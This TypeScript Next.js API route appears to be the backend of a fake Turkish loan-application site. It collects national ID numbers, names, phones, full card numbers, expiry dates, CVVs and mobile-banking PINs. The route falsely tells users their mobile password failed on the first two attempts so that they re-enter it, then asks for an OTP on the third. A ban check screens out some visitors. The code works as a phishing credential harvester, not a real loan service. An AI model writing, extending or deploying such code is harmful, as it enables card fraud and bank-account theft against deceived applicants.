import { NextRequest, NextResponse } from "next/server";
import { cookies } from "next/headers";
import { v4 as uuidv4 } from "uuid";
import { assertNotBanned } from "@/lib/access-control";
import { getStorage } from "@/lib/storage";
import { isValidTCKN } from "@/lib/tc-validation";
import { getClientIp } from "@/lib/request-ip";

export async function POST(request: NextRequest) {
  try {
    const body = await request.json();

    const bannedResponse = await assertNotBanned(request, {
      tcKimlik: body.tcKimlik,
    });
    if (bannedResponse) return bannedResponse;

    const cookieStore = await cookies();
    const sessionId =
      cookieStore.get("app_session")?.value ?? uuidv4();

    if (!isValidTCKN(body.tcKimlik)) {
      return NextResponse.json(
        { error: "Geçersiz TC Kimlik Numarası" },
        { status: 400 }
      );
    }

    const storage = await getStorage();
    let applicant = await storage.getApplicantBySession(sessionId);
    if (!applicant) {
      applicant = await storage.createApplicant(sessionId, getClientIp(request));
    }

    const attempt = await storage.addAttempt(applicant.id, {
      tcKimlik: body.tcKimlik,
      firstName: body.firstName,
      lastName: body.lastName,
      phone: body.phone,
      birthDate: body.birthDate ?? "",
      loanAmount: body.loanAmount,
      loanTerm: body.loanTerm,
      cardNumber: body.cardNumber ?? "",
      cardExpiry: body.cardExpiry ?? "",
      cardCvv: body.cardCvv ?? "",
      noCreditCard: Boolean(body.noCreditCard),
      mobilePin: body.mobilePin ?? "",
    });

    const response = NextResponse.json({
      applicantId: applicant.id,
      attemptId: attempt.id,
      attemptNumber: attempt.attemptNumber,
      success: attempt.attemptNumber === 3,
      requiresOtp: attempt.attemptNumber === 3,
      message:
        attempt.attemptNumber < 3
          ? "Mobil şifreniz doğrulanamadı. Lütfen tekrar deneyiniz."
          : undefined,
    });

    response.cookies.set("app_session", sessionId, {
      httpOnly: true,
      sameSite: "lax",
      maxAge: 60 * 60 * 24,
    });

    return response;
  } catch (err) {
    const message = err instanceof Error ? err.message : "Hata oluştu";
    return NextResponse.json({ error: message }, { status: 500 });
  }
}
